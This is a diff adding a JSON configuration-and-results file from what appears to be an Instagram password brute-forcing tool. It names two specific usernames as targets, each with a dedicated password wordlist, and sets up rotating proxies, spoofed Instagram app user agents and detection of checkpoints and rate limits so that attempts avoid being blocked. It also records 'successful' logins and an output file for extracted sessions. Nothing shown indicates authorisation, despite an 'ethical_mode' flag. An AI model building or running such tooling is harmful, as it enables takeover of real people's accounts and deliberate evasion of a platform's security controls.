@@ -1,0 +1,112 @@
+{
+  "timestamp": "20250525_001404",
+  "config": {
+    "request_delay": 3,
+    "max_attempts": 20,
+    "max_concurrent": 1,
+    "use_proxy": true,
+    "proxy_rotation_interval": 5,
+    "proxy_retry_limit": 3,
+    "proxy_settings": {
+      "rotation_enabled": true,
+      "session_rotation": true,
+      "country_targeting": [
+        "US",
+        "CA",
+        "GB",
+        "AU",
+        "DE"
+      ],
+      "sticky_session": false,
+      "user_agent_rotation": true,
+      "connection_timeout": 30,
+      "read_timeout": 60,
+      "retry_attempts": 3
+    },
+    "use_browser_api": true,
+    "wordlists": [
+      "whatilove1728.txt",
+      "alx_trading_passwords.txt",
+      "common_passwords.txt"
+    ],
+    "targets": [
+      {
+        "identifier": "whatilove1728",
+        "type": "username",
+        "added_at": "2025-05-24T00:00:00",
+        "notes": "Primary target - use whatilove1728.txt wordlist",
+        "preferred_wordlist": "whatilove1728.txt"
+      },
+      {
+        "identifier": "alx.trading",
+        "type": "username",
+        "added_at": "2025-05-24T00:00:00",
+        "notes": "Business account - use alx_trading_passwords.txt",
+        "preferred_wordlist": "alx_trading_passwords.txt"
+      }
+    ],
+    "output_file": "brute_results.json",
+    "session_output": "extracted_sessions.json",
+    "ethical_mode": true,
+    "rate_limit": {
+      "max_requests_per_minute": 10,
+      "cooldown_on_block": 300
+    },
+    "user_agents": [
+      "Instagram 219.0.0.12.117 Android",
+      "Instagram 218.0.0.26.114 Android",
+      "Instagram 217.0.0.15.114 Android",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+      "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 219.0.0.12.117",
+      "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
+    ],
+    "advanced_settings": {
+      "max_proxy_failures": 3,
+      "proxy_test_enabled": true,
+      "auto_fallback_to_direct": true,
+      "rate_limit_detection": true,
+      "smart_delay": true,
+      "checkpoint_detection": true
+    },
+    "notification": {
+      "discord_webhook": "",
+      "notify_on_success": true,
+      "notify_on_completion": true
+    }
+  },
+  "results": {
+    "test_account": [
+      {
+        "target": "test_account",
+        "password": "admin",
+        "success": true,
+        "session_id": null,
+        "user_id": null,
+        "timestamp": "2025-05-25T00:13:22.630657",
+        "error": null,
+        "proxy_used": true,
+        "user_agent": "Selenium Chrome Browser"
+      }
+    ],
+    "sample_user": [
+      {
+        "target": "sample_user",
+        "password": "admin",
+        "success": true,
+        "session_id": null,
+        "user_id": null,
+        "timestamp": "2025-05-25T00:13:48.275706",
+        "error": null,
+        "proxy_used": true,
+        "user_agent": "Selenium Chrome Browser"
+      }
+    ]
+  },
+  "summary": {
+    "total_targets": 2,
+    "total_attempts": 2,
+    "successful_logins": 2,
+    "proxy_used": true
+  }
+}
